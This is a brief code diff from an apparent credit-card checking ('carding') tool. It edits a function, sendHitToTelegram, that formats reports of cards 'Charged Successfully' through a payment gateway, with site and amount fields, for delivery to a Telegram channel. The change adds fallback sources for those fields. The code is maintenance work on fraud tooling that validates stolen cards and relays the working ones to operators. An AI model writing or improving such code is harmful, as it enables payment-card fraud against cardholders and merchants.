@@ -446,8 +446,8 @@ async function sendHitToTelegram(card, res) {
 👤 ${userName} [Gold]
 ↔️ <b>Gateway</b>: ${gateway}
 ✅ <b>Response</b>: Charged Successfully
-🌐 <b>Site</b>: ${res.site || 'Unknown'}
-💰 <b>Amount</b>: ${res.amount || 'Unknown'}
+🌐 <b>Site</b>: ${res.site || analyzedData.site || 'Unknown'}
+💰 <b>Amount</b>: ${res.amount || analyzedData.amount || 'Unknown'}
 `.trim();
 
     try {
